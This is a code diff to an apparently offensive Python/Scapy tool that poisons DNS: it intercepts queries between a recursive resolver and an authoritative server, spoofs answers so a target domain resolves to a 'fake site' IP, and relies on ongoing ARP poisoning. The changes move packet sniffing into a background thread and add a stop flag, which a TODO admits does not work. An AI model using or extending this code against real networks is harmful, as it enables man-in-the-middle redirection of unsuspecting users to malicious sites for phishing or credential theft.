@@ -1,3 +1,5 @@
+import threading
+
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from scapy.layers.inet import UDP, IP
@@ -13,9 +15,9 @@ class DnsPois:
         self.stop = False
         self.thread = None
         self.stop_thread = None
+        self.stop = False
 
-    @staticmethod
-    def responder(auth_ip, rec_ip, mal_ip, domain):
+    def responder(self, auth_ip, rec_ip, mal_ip, domain):
         """
         Forwards a packet to the original recipient if it is not a packet we wish to falsify
         """
@@ -29,9 +31,6 @@ class DnsPois:
         """
         def get_resp(pkt):
 
-            # print(pkt.show())
-            print(domain)
-
             if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                     str(pkt[IP].dst) == auth_ip:
 
@@ -43,12 +42,14 @@ class DnsPois:
                     return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
                 else:
                     forward(pkt)
-                    return "Don't care " + str(pkt['DNS Question Record'].qname)
+                    return "Irrelevant " + str(pkt['DNS Question Record'].qname)
             else:
                 forward(pkt)
-                return "Don't care"
+                return "Irrelevant"
 
-        return get_resp
+        # TODO: this does not work
+        while not self.stop:
+            return get_resp
 
     def set(self, auth_dns, rec_dns, mal_dns, dom):
         self.domain = dom
@@ -61,6 +62,7 @@ class DnsPois:
         print("auth server: " + self.auth_ip)
         print("NS: " + self.rec_ip)
         print("Fake site: " + self.mal_ip)
+
         # Since ARP poisoning ongoing is a prerequisite
         # We have to turn off automatic forwarding
         # else the packets are forwarded before we can spoof them
@@ -71,5 +73,13 @@ class DnsPois:
         except FileNotFoundError:
             pass
 
-        sniff(prn=self.responder(self.auth_ip,
-                                 self.rec_ip, self.mal_ip, self.domain))
+        self.stop = False
+        self.thread = threading.Thread(target=self.sniff)
+        self.thread.start()
+
+    def sniff(self):
+        sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain))
+
+    def stop_poisoning(self):
+        self.stop = True
+        # self.stop_thread = threading.Thread(target=self.restore_network)
